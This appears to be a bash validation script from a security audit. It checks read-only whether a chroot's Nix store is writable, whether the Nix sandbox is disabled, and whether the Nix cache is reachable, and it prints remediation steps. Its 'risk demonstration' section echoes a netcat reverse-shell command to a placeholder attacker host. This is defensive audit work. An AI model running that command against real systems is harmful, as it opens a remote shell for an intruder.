#!/usr/bin/env bash
# =============================================================================
# VALIDATION SCRIPT 06: Nix Store Write Access
# =============================================================================
#
# FINDING: HIGH-003 - Nix Sandbox Disabled / Store Writable
# SEVERITY: HIGH
#
# TECHNICAL DETAILS:
# ------------------
# The chroot mounts /nix without the 'ro' (read-only) flag:
#   mount_if_needed /nix "$CHROOT_DIR/nix" bind
#
# Combined with:
#   sandbox = false  (in nix.conf)
#   allowUnfree = true (in shell.nix)
#
# This allows:
# 1. Writing to Nix store (if permissions allow)
# 2. Building arbitrary packages without sandboxing
# 3. Installing unfree/proprietary packages
# 4. Potentially adding setuid binaries via Nix
#
# RISK LEVEL: SAFE TEST
# This script only checks permissions, does NOT write to /nix.
#
# =============================================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "=============================================="
echo "VALIDATION 06: Nix Store Write Access"
echo "=============================================="
echo ""

VULNERABLE=false

# Test 1: Check if /nix is mounted
echo "[TEST 1] Checking /nix mount status..."
if mountpoint -q /nix 2>/dev/null; then
    echo "  /nix is a mountpoint"

    # Check mount options
    MOUNT_OPTS=$(grep ' /nix ' /proc/mounts 2>/dev/null | awk '{print $4}' || echo "unknown")
    echo "  Mount options: $MOUNT_OPTS"

    if echo "$MOUNT_OPTS" | grep -q '\bro\b'; then
        echo -e "${GREEN}  Mounted read-only${NC}"
    else
        echo -e "${RED}  Mounted read-write${NC}"
        VULNERABLE=true
    fi
elif [[ -d /nix ]]; then
    echo "  /nix exists but not a separate mountpoint"
else
    echo "  /nix does not exist"
fi

# Test 2: Check write permissions
echo ""
echo "[TEST 2] Checking write permissions..."

NIX_PATHS=("/nix/store" "/nix/var" "/nix/var/nix/profiles")
for path in "${NIX_PATHS[@]}"; do
    if [[ -d "$path" ]]; then
        if [[ -w "$path" ]]; then
            echo -e "${RED}  $path - WRITABLE${NC}"
            VULNERABLE=true
        else
            echo -e "${GREEN}  $path - read-only${NC}"
        fi
    fi
done

# Test 3: Check nix.conf settings
echo ""
echo "[TEST 3] Checking Nix configuration..."

NIX_CONF_PATHS=("/etc/nix/nix.conf" "$HOME/.config/nix/nix.conf")
for conf in "${NIX_CONF_PATHS[@]}"; do
    if [[ -f "$conf" ]]; then
        echo "  Found: $conf"

        # Check sandbox setting
        if grep -q "sandbox = false" "$conf" 2>/dev/null; then
            echo -e "${RED}    sandbox = false (INSECURE)${NC}"
            VULNERABLE=true
        elif grep -q "sandbox = true" "$conf" 2>/dev/null; then
            echo -e "${GREEN}    sandbox = true${NC}"
        else
            echo -e "${YELLOW}    sandbox setting not found (default varies)${NC}"
        fi

        # Check for experimental features
        if grep -q "experimental-features" "$conf" 2>/dev/null; then
            FEATURES=$(grep "experimental-features" "$conf" | head -1)
            echo "    $FEATURES"
        fi
    fi
done

# Test 4: Check if nix commands are available
echo ""
echo "[TEST 4] Checking Nix command availability..."

NIX_CMDS=("nix" "nix-build" "nix-shell" "nix-env")
for cmd in "${NIX_CMDS[@]}"; do
    if command -v "$cmd" &>/dev/null; then
        echo -e "${YELLOW}  $cmd available${NC}"
    fi
done

# Test 5: Check network access to cache.nixos.org
echo ""
echo "[TEST 5] Checking Nix cache accessibility..."
if command -v dig &>/dev/null; then
    CACHE_IP=$(dig +short cache.nixos.org A 2>/dev/null | head -1)
    if [[ -n "$CACHE_IP" ]]; then
        echo -e "${YELLOW}  cache.nixos.org resolves to: $CACHE_IP${NC}"
        echo "  (If HTTPS allowed, arbitrary packages can be downloaded)"
    else
        echo -e "${GREEN}  cache.nixos.org not resolvable${NC}"
    fi
fi

# Test 6: Demonstrate risk
echo ""
echo "[TEST 6] Risk demonstration..."
echo "  With nix-shell and network access, an attacker could:"
echo ""
echo "    # Install arbitrary packages"
echo "    nix-shell -p netcat --run 'nc attacker.com 4444 -e /bin/bash'"
echo ""
echo "    # Build custom malicious packages"
echo "    nix-build '<nixpkgs>' -A malicious-pkg"
echo ""
echo "    # Create setuid binaries (if store writable)"
echo "    # (would require root or nix-daemon access)"

# Test 7: Check for unfree allowance in shell.nix
echo ""
echo "[TEST 7] Checking for unfree package allowance..."
if [[ -f ~/shell.nix ]]; then
    if grep -q "allowUnfree = true" ~/shell.nix 2>/dev/null; then
        echo -e "${YELLOW}  allowUnfree = true in ~/shell.nix${NC}"
        echo "  Proprietary/unfree packages can be installed"
    fi
fi

echo ""
echo "=============================================="
if $VULNERABLE; then
    echo -e "${RED}RESULT: VULNERABLE${NC}"
    echo ""
    echo "Nix store is writable and/or sandbox is disabled."
    echo ""
    echo "REMEDIATION:"
    echo "  1. Mount /nix read-only: mount -o bind,ro"
    echo "  2. Enable Nix sandbox: sandbox = true"
    echo "  3. Use overlay filesystem for writes"
    echo "  4. Pre-build all required packages"
    echo "  5. Block network access to cache.nixos.org"
else
    echo -e "${GREEN}RESULT: NOT VULNERABLE${NC}"
    echo ""
    echo "Nix store appears properly restricted."
fi
echo "=============================================="
